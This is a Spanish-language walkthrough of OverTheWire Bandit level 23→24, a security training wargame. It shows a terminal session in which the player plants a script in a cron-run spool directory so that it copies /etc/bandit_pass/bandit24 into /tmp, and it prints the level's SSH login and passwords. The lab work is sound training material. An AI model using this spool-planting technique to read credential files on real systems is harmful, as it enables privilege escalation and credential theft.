# Bandit Level 23 → Level 24

## Objetivo de nivel
Un programa se ejecuta automáticamente a intervalos regulares desde **cron**, el programador de trabajos basado en el tiempo. Busque en /**etc/cron.d/** la configuración y ver qué comando se está ejecutando.

**NOTA:** Este nivel requiere que crees tu propio primero shell-script. Este es un paso muy grande del que deberías estar orgulloso. ¡Tú mismo cuando superas este nivel!

**NOTA 2:** Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee mantener una copia alrededor ...

## Datos de acceso al nivel
``` bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

## Solución
``` bash
bandit23@bandit:~$ mkdir /tmp/jmjp00
bandit23@bandit:~$ cd /tmp
bandit23@bandit:/tmp$ cd jmjp00
bandit23@bandit:/tmp/jmjp00$ nano jmjpscript.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/jmjp00$ cat jmjpscript.sh
cat /etc/bandit_pass/bandit24 > /tmp/jmjp00/password
bandit23@bandit:/tmp/jmjp00$ chmod 777 jmjpscript.sh
bandit23@bandit:/tmp/jmjp00$ touch password
bandit23@bandit:/tmp/jmjp00$ chmod 666 password
bandit23@bandit:/tmp/jmjp00$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 18:33 .
drwxrwx-wt 3010 root     root     106496 Feb 28 18:33 ..
-rwxrwxrwx    1 bandit23 bandit23     53 Feb 28 18:32 jmjpscript.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 18:33 password
bandit23@bandit:/tmp/jmjp00$ cp jmjpscript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/jmjp00$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 18:33 .
drwxrwx-wt 3010 root     root     106496 Feb 28 18:36 ..
-rwxrwxrwx    1 bandit23 bandit23     53 Feb 28 18:32 jmjpscript.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 18:36 password
bandit23@bandit:/tmp/jmjp00$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Notas adicionales


## Referencias
